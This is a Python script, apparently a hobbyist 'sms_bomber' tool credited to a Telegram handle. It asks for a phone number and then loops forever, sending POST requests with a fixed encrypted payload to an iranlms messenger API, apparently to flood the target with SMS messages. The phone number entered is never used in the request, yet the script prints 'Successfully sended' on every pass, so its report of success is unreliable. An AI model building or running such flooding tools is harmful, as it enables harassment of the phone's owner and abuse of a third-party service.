import requests
import os
red='\033[31m'
green='\033[32m'
blue='\033[36m'
pink='\033[35m'
rang='\033[34m'
link = "https://shadmessenger18.iranlms.ir"
os.system("for i in {1..12}; do for j in $(seq 1 $i); do echo -ne $i?—$j=$((i*j))\\t;done; echo;done")
os.system("clear")
print(f"{red} ")
print("        ,     \    /      , ")
print("       / \    )\__/(     / \ ")
print("      /   \  (_\  /_)   /   \ ")
print(" ____/_____\__\@  @/___/_____\____ ")
print("|             |\../|              | ")
print("|              \VV/               | ")
print("|     mamoozesh \/ mrmahdi        | ")
print("|_________________________________| ")
print(" |    /\ /      \\        \ /\    | ")
print(" |  /   V       ))        V   \  | ")
print(" |/     °       //        °     \| ")
print(" °              V                ° ")
print(f"{pink} ")
print("∆ΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠ∆")
print(f"{blue} ")
print("Telegram : @mrmahdi8800")
print(f"{pink} ")
print("∆ΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠ∆")
print(f"{green} ")
print("|1|Start sms_bomber")
print("|2|TestNet")
print("|3|Exit")
print(f"{rang} ")
Elite = int(input("|?|choose <>> : "))
if Elite == 1:
    number = input("please send number {9×××××××} : ")
    while True:
              requests.post(link,data={"api_version":"5","tmp_session":"ncqitihmmzczkxarlelnygjfwidcxhlz","data_enc":"1/xi16DNlr5ORqtle/2B6AZ/TOX2/CO6jQjCFLztP8Y5aoap/3LCXecyH1MFdUrXcP8hupYue69xnb/VxRvfNtDc+QZTcV1ufU9QMRTmiTHp9tWKtCPLFboUWa3Xvj1Za/ckjrnMrKS494YGZnV2t78WurEzlKgEbCCutpv3oomCBQilQFQCd+rhpRIwGUtNaEfPUyVpCmNerCX9eac9WIhr6ofLiwV0VqobDTC6OxOZZTS0Q1M1hFK5uiJjwRUt"})
              print("Successfully sended", number)
elif Elite == 3:
    os.system("clear")
    os.system("figlet mrmahdi ")
elif Elite == 2:
    os.system("clear")
    os.system("toilet mrmahdi")
    os.system("pip install speedtest-cli")
    os.system("speedtest-cli")
elif Elite == 4:
    os.system("telnet towel.blinkenlights.nl")
